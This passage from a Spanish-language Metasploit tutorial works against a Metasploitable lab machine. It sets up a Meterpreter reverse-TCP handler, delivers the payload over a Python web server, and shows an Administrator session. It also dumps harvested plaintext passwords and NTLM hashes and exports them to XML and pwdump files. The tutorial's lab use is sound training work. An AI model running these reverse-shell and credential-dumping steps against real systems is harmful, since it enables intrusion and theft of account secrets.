msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <NUESTRA_IP>; set LPORT 4444; exploit"
```

* `msfconsole -q` → Inicia Metasploit en modo silencioso (sin el banner).
* `-x` → Permite ejecutar una secuencia de comandos.
* `"comando1; comando2; comando3"` → Los comandos de Metasploit encadenados dentro de las comillas.

Esto se queda a la escucha y al abrir el exploit en la máquina recibiríamos la conexión de Meterpreter.

### Envio del exploit a la máquina

Lo más sencillo sería levantar un servidor local con python en Kali Linux y si la máquina Metasploitable tiene conexión a internet podríamos acceder a través del navegador por nuestra IP:

```
python3 -m http.server 80
```

<figure><img src="/files/LOVu9w9suMdA3TewTcLu" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/FpHyqCEHOVHg7HePGfSa" alt=""><figcaption></figcaption></figure>

### Recibimos el Meterpreter

Al ejecutar el exploit recibimos correctamente la sesión de Meterpreter:

```bash
[*] Started reverse TCP handler on 192.168.1.191:4444 
[*] Sending stage (177734 bytes) to 192.168.1.133
[*] Meterpreter session 1 opened (192.168.1.191:4444 -> 192.168.1.133:49402) at 2025-01-29 09:50:19 +0000

meterpreter > getuid
Server username: VAGRANT-2008R2\Administrator
```

***

## <mark style="color:purple;">**Exportar y analizar datos**</mark>

Decir que todos los datos que vamos encontrando en la máquina se almacenan en la base de datos. Por ejemplo, en este punto podríamos ver todas las credenciales que hemos conseguido con `creds`:

```
msf6 > creds

Credentials
===========

host           origin         service        public            private                                                            realm  private_type  JtR Format  cracked_password
----           ------         -------        ------            -------                                                            -----  ------------  ----------  ----------------
               192.168.1.185                                   vagrant                                                                   Password
               192.168.1.185                                   ,'b[`>ib7ukUE                                                             Password
               192.168.1.185                                   @4R8#/WPzWN-oyJin82\U';O*H,ED                                             Password
               192.168.1.185                 .\sshd_server     D@rj33l1ng                                                                Password
192.168.1.185  192.168.1.185  445/tcp (smb)  Administrator     aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b         NTLM hash     nt,lm
192.168.1.185  192.168.1.185  445/tcp (smb)  anakin_skywalker  aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa         NTLM hash     nt,lm
192.168.1.185  192.168.1.185  445/tcp (smb)  artoo_detoo       aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4         NTLM hash     nt,lm
192.168.1.185  192.168.1.185  445/tcp (smb)  ben_kenobi        aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859         NTLM hash     nt,lm
192.168.1.185  192.168.1.185  445/tcp (smb)  boba_fett         aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9         NTLM hash     nt,lm
192.168.1.185  192.168.1.185  445/tcp (smb)  chewbacca         aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8         NTLM hash     nt,lm
192.168.1.185  192.168.1.185  445/tcp (smb)  c_three_pio       aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee         NTLM hash     nt,lm
192.168.1.185  192.168.1.185  445/tcp (smb)  darth_vader       aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0         NTLM hash     nt,lm
192.168.1.185  192.168.1.185  445/tcp (smb)  greedo            aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db         NTLM hash     nt,lm
192.168.1.185  192.168.1.185  445/tcp (smb)  han_solo          aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951         NTLM hash     nt,lm
192.168.1.185  192.168.1.185  445/tcp (smb)  jabba_hutt        aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76         NTLM hash     nt,lm
192.168.1.185  192.168.1.185  445/tcp (smb)  jarjar_binks      aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4         NTLM hash     nt,lm
192.168.1.185  192.168.1.185  445/tcp (smb)  kylo_ren          aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001         NTLM hash     nt,lm
192.168.1.185  192.168.1.185  445/tcp (smb)  lando_calrissian  aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f         NTLM hash     nt,lm
192.168.1.185  192.168.1.185  445/tcp (smb)  leia_organa       aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028         NTLM hash     nt,lm
192.168.1.185  192.168.1.185  445/tcp (smb)  luke_skywalker    aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a         NTLM hash     nt,lm
192.168.1.185  192.168.1.185  445/tcp (smb)  sshd_server       aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035         NTLM hash     nt,lm
192.168.1.185  192.168.1.185  445/tcp (smb)  vagrant           aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b         NTLM hash     nt,lm
192.168.1.185  192.168.1.185  445/tcp (smb)  administrator     vagrant                                                                   Password
192.168.1.185  192.168.1.185  21/tcp (ftp)   administrator     vagrant                                                                   Password
192.168.1.185  192.168.1.185  445/tcp (smb)  vagrant           vagrant                                                                   Password
192.168.1.185  192.168.1.185  22/tcp (ssh)   vagrant           vagrant                                                                   Password
192.168.1.185  192.168.1.185  21/tcp (ftp)   vagrant           vagrant                                                                   Password
```

### **Exportar información de la base de datos**

Puedes guardar los datos recopilados en un formato xml reutilizable que podemos importar en otras herramientas para gestionar los datos:

```bash
msf6 > db_export -f xml -o metasploitable-win-export.xml
[*] Starting export of workspace default to metasploitable-win-export.xml [ xml ]...
[*] Finished export of workspace default to metasploitable-win-export.xml [ xml ]...
```

También permite usar el formato .pwdump, en el que se almacenan todas las credenciales obtenidas:

```bash
msf6 > db_export -f pwdump -o metasploitable-export.pwdump
[*] Starting export of workspace default to metasploitable-export.pwdump [ pwdump ]...
[*] Finished export of workspace default to metasploitable-export.pwdump [ pwdump ]...
```

```bash
cat metasploitable-export.pwdump

# Metasploit PWDump Export 2.0
# Generated: 2025-01-26 17:12:19 UTC
# Project: default
#
#########################################################

#  LM/NTLM Hashes (18 hashes, 1 services)
  
# 192.168.1.185:445/tcp (smb)
Administrator:1:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
  
# 192.168.1.185:445/tcp (smb)
anakin_skywalker:2:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa:::
  
# 192.168.1.185:445/tcp (smb)
artoo_detoo:3:aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4:::
  
# 192.168.1.185:445/tcp (smb)
ben_kenobi:4:aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859:::
  
# 192.168.1.185:445/tcp (smb)
boba_fett:5:aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9:::
  
# 192.168.1.185:445/tcp (smb)
chewbacca:6:aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8:::
```

### **Limpiar la base de datos**

Si necesitas limpiar información para comenzar un nuevo análisis:

```bash
msf6 > hosts -d     # Elimina todos los host encontrados
msf6 > services -d  # Elimina todos los servicios corriendo
msf6 > vulns -d     # Elimina todas las vulnerabilidades encontradas
msf6 > creds -d     # Elimina todas las credenciales obtenidas
msf6 > loot -d      # Elimina todo el loot obtenido (archivos importantes)

# Reiniciar la base de datos
#---------------------------
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
```
